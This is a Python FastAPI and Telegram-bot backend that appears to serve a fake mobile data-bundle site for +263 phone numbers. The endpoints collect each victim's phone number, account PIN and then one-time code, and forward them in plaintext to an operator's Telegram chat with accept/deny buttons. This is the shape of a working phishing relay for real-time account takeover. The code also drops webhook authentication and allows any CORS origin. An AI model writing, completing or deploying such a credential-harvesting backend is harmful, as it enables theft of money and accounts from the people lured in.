import os
import uuid
from typing import Dict, Any
from contextlib import asynccontextmanager
from fastapi import FastAPI, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CallbackQueryHandler, ContextTypes

# --- CONFIGURATION ---
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID")

if not BOT_TOKEN or not ADMIN_CHAT_ID:
    raise ValueError("BOT_TOKEN and ADMIN_CHAT_ID are required")

transactions: Dict[str, Dict[str, Any]] = {}

# --- PYDANTIC MODELS ---
class LoginRequest(BaseModel):
    phone: str
    pin: str
    duration: str
    voice: int
    sms: int
    data: float
    price: str

class OTPRequest(BaseModel):
    phone: str
    otp: str
    duration: str
    price: str

# --- TELEGRAM BOT SETUP ---
ptb_app = Application.builder().token(BOT_TOKEN).updater(None).build()

async def handle_telegram_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    print(f"⚡ Button Handler Triggered! Data: {query.data}")
    
    try:
        await query.answer(text="Processing...") 
        data = query.data.split(":")
        action = data[0]
        tx_id = data[1]

        if tx_id in transactions:
            if action == "accept":
                transactions[tx_id]["status"] = "approved"
                await query.edit_message_text(text=f"{query.message.text}\n\n✅ <b>APPROVED</b>", parse_mode="HTML")
            elif action == "deny":
                transactions[tx_id]["status"] = "denied"
                await query.edit_message_text(text=f"{query.message.text}\n\n❌ <b>DENIED</b>", parse_mode="HTML")
        else:
            await query.edit_message_text(text=f"{query.message.text}\n\n⚠️ <b>EXPIRED</b> (Server restarted)", parse_mode="HTML")
    except Exception as e:
        print(f"❌ Button Handler Error: {e}")

ptb_app.add_handler(CallbackQueryHandler(handle_telegram_buttons))

# --- FASTAPI LIFESPAN ---
@asynccontextmanager
async def lifespan(app: FastAPI):
    await ptb_app.initialize()
    await ptb_app.start()
    yield
    await ptb_app.stop()
    await ptb_app.shutdown()

app = FastAPI(lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"], 
    allow_credentials=False, 
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- API ENDPOINTS ---
@app.post("/api/initiate-login")
async def initiate_login(req: LoginRequest):
    tx_id = str(uuid.uuid4())
    transactions[tx_id] = {"status": "pending", "type": "login", "data": req.model_dump()}
    
    message = (
        f"🔐 <b>NEW LOGIN ATTEMPT</b>\n\n"
        f"📱 <b>Phone:</b> +263 {req.phone}\n"
        f"🔑 <b>PIN:</b> {req.pin}\n\n"
        f"📦 <b>Bundle:</b> {req.duration}\n"
        f"💰 <b>Price:</b> USD {req.price}\n\n"
        f"👇 <i>Do you want to accept this login?</i>"
    )
    keyboard = [[
        InlineKeyboardButton("✅ ACCEPT", callback_data=f"accept:{tx_id}:login"),
        InlineKeyboardButton("❌ DENY", callback_data=f"deny:{tx_id}:login")
    ]]
    try:
        await ptb_app.bot.send_message(chat_id=ADMIN_CHAT_ID, text=message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
        print(f"📝 Sent Login to Telegram. TX: {tx_id}")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
    return {"transaction_id": tx_id}

@app.post("/api/verify-otp")
async def verify_otp(req: OTPRequest):
    tx_id = str(uuid.uuid4())
    transactions[tx_id] = {"status": "pending", "type": "otp", "data": req.model_dump()}
    
    message = (
        f"🔢 <b>NEW OTP ENTERED</b>\n\n"
        f"📱 <b>Phone:</b> +263 {req.phone}\n"
        f"🔢 <b>OTP Code:</b> <code>{req.otp}</code>\n\n"
        f"📦 <b>Bundle:</b> {req.duration}\n"
        f"💰 <b>Price:</b> USD {req.price}\n\n"
        f"👇 <i>Do you want to accept this OTP?</i>"
    )
    keyboard = [[
        InlineKeyboardButton("✅ ACCEPT", callback_data=f"accept:{tx_id}:otp"),
        InlineKeyboardButton("❌ DENY", callback_data=f"deny:{tx_id}:otp")
    ]]
    try:
        await ptb_app.bot.send_message(chat_id=ADMIN_CHAT_ID, text=message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
    return {"transaction_id": tx_id}

@app.get("/api/status/{tx_id}")
async def get_status(tx_id: str):
    if tx_id not in transactions:
        return {"status": "denied"} 
    return {"status": transactions[tx_id]["status"]}

# --- WEBHOOK ENDPOINTS ---
@app.post("/api/webhook/telegram")
async def telegram_webhook(request: Request):
    # We temporarily removed the secret check to ensure Telegram can reach us
    update_data = await request.json()
    print(f"📥 INCOMING WEBHOOK: {update_data}")
    
    try:
        update = Update.de_json(update_data, ptb_app.bot)
        await ptb_app.process_update(update)
    except Exception as e:
        print(f"❌ Webhook Process Error: {e}")
    return {"status": "ok"}

@app.get("/api/webhook/set")
async def set_telegram_webhook():
    base_url = os.environ.get("RENDER_EXTERNAL_URL")
    if not base_url:
        base_url = "https://mixdatahub-fullstack.onrender.com" # Hardcoded fallback
    
    webhook_url = f"{base_url.rstrip('/')}/api/webhook/telegram"
    
    try:
        await ptb_app.bot.delete_webhook(drop_pending_updates=True)
        # Set webhook WITHOUT secret token and WITHOUT allowed_updates restriction
        await ptb_app.bot.set_webhook(url=webhook_url)
        return {"status": "success", "webhook_url": webhook_url}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))